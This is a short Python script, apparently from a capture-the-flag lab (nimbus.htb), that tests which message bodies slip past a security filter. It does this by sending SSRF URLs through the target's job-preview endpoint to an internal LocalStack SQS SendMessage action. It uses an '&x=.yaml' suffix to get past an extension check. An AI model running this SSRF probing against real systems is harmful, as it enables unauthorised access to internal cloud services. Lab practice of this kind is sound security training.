import urllib.parse
import requests

LOCALSTACK = "172.18.0.2:4566"
ACCOUNT = "<REDACTED_ACCOUNT_ID>"
QUEUE = "nimbus-jobs"

def test(label, body):
    enc = urllib.parse.quote(body, safe="")
    url = f"http://{LOCALSTACK}/{ACCOUNT}/{QUEUE}?Action=SendMessage&Version=2012-11-05&MessageBody={enc}&x=.yaml"
    r = requests.post("http://nimbus.htb/jobs/preview", data={"url": url}, timeout=15)
    verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
    print(f"{label:30s} raw={body!r:40s} -> {verdict}")

test("plain", "helloworld")
test("with colon", "hello:world")
test("with newline", "hello\nworld")
test("with slash", "hello/world")
test("with colon+slash", "hello://world")
